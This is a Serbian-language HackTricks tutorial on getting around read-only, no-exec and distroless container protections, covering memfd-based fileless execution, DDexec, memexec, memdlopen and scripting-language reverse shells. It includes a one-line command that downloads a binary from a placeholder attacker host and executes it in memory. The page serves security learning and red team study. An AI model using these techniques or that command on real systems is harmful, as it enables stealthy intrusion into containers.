# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Video

U sledećim video snimcima možete naći tehnike pomenute na ovoj stranici objašnjene detaljnije:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec scenario

Sve je češće nalaziti linux mašine montirane sa **read-only (ro) zaštitom fajl sistema**, posebno u kontejnerima. To je zato što je pokretanje kontejnera sa ro fajl sistemom jednostavno kao postavljanje **`readOnlyRootFilesystem: true`** u `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Međutim, čak i ako je fajl sistem montiran kao ro, **`/dev/shm`** će i dalje biti zapisiv, pa nije tačno da ne možemo ništa zapisati na disk. Ipak, ovaj direktorijum će biti **montiran sa no-exec zaštitom**, pa ako ovde preuzmete binarni fajl **nećete moći da ga izvršite**.

> [!WARNING]
> Sa red team perspektive, ovo čini **težim preuzimanje i izvršavanje** binarnih fajlova koji već nisu u sistemu (kao backdoors ili enumerators poput `kubectl`).

## Easiest bypass: Scripts

Imajte na umu da sam pomenuo binaries — možete **izvršiti bilo koji script** sve dok je interpreter prisutan na mašini, na primer **shell script** ako je `sh` prisutan ili **python** **script** ako je `python` instaliran.

Međutim, ovo samo po sebi nije dovoljno da izvršite vaš binarni backdoor ili druge binarne alate koje možda morate pokrenuti.

## Memory Bypasses

Ako želite da izvršite binarni fajl, ali fajl sistem to ne dozvoljava, najbolji način je da ga **izvršite iz memorije**, jer tamo **zaštite ne važe**.

### FD + exec syscall bypass

Ako na mašini imate moćne skript engine-e kao što su **Python**, **Perl**, ili **Ruby**, možete preuzeti binarni fajl za izvršavanje iz memorije, smestiti ga u memorijski file descriptor (`create_memfd` syscall), koji neće biti zaštićen tim zaštitama, i zatim pozvati **`exec` syscall** navodeći **fd kao fajl za izvršenje**.

Za ovo možete lako koristiti projekat [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Prosledite mu binarni fajl i on će generisati skriptu u naznačenom jeziku sa **binarijem kompresovanim i b64 enkodovanim**, sa instrukcijama kako da ga **dekodirate i dekompresujete** u **fd** kreiran pozivanjem `create_memfd` syscall-a i pozivom **exec** syscall-a da ga pokrene.

> [!WARNING]
> Ovo ne radi u drugim skript jezicima kao što su PHP ili Node zato što nemaju nijedan podrazumevani način da pozovu sirove syscall-ove iz skripte, pa nije moguće pozvati `create_memfd` da se kreira **memorijski fd** za skladištenje binarija.
>
> Štaviše, kreiranje **regularnog fd** sa fajlom u `/dev/shm` neće raditi, jer vam neće biti dozvoljeno da ga pokrenete zbog primene **no-exec zaštite**.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) je tehnika koja vam dozvoljava da **modifikujete memoriju sopstvenog procesa** prepisujući njegov **`/proc/self/mem`**.

Dakle, kontrolišući **assembly kod** koji proces izvršava, možete napisati **shellcode** i "mutirati" proces da **izvrši bilo koji proizvoljan kod**.

> [!TIP]
> **DDexec / EverythingExec** će vam omogućiti da učitate i **izvršite** vlastiti **shellcode** ili **bilo koji binary** iz **memorije**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
For more information about this technique check the Github or:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) je logičan naredni korak nakon DDexec. To je **DDexec shellcode demonised**, tako da svaki put kad želite da **run a different binary** ne morate ponovo da pokrećete DDexec — možete jednostavno pokrenuti memexec shellcode preko DDexec tehnike i potom **communicate with this deamon to pass new binaries to load and run**.

Možete naći primer kako koristiti **memexec to execute binaries from a PHP reverse shell** u [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Sa sličnim ciljem kao DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) tehnika omogućava **easier way to load binaries** u memoriju da bi se kasnije izvršili. Može čak omogućiti i učitavanje binaries sa zavisnostima.

## Distroless Bypass

Za posvećeno objašnjenje **what distroless actually is**, kada pomaže, kada ne pomaže, i kako menja post-exploitation tradecraft u kontejnerima, pogledajte:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### Šta je distroless

Distroless containeri sadrže samo najosnovnije komponente neophodne za pokretanje određene aplikacije ili servisa, kao što su biblioteke i runtime dependencies, ali isključuju veće komponente poput package manager, shell ili sistemskih utilitija.

Cilj distroless containera je da smanji površinu napada kontejnera uklanjanjem nepotrebnih komponenti i minimizuje broj ranjivosti koje se mogu iskoristiti.

### Reverse Shell

U distroless containeru možda čak i nećete naći `sh` ili `bash` da dobijete regularan shell. Takođe nećete naći binarne kao `ls`, `whoami`, `id`... sve što obično pokrećete na sistemu.

> [!WARNING]
> Stoga, nećete moći da dobijete **reverse shell** ili da **enumerate** sistem kao što to obično radite.

Međutim, ako kompromitovani container pokreće, na primer, flask web, tada je python instaliran i možete dobiti **Python reverse shell**. Ako pokreće node, možete dobiti Node rev shell, i isto važi za većinu **scripting language**.

> [!TIP]
> Koristeći scripting language možete **enumerate the system** koristeći mogućnosti jezika.

Ako ne postoje **`read-only/no-exec`** zaštite, možete zloupotrebiti reverse shell da upišete svoje binaries u fajl sistem i **execute** ih.

> [!TIP]
> Međutim, u ovakvim kontejnerima ove zaštite će obično postojati, ali možete koristiti **previous memory execution techniques to bypass them**.

Možete naći **examples** kako da **exploit some RCE vulnerabilities** da biste dobili scripting languages **reverse shells** i izvršavali binaries iz memorije na [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
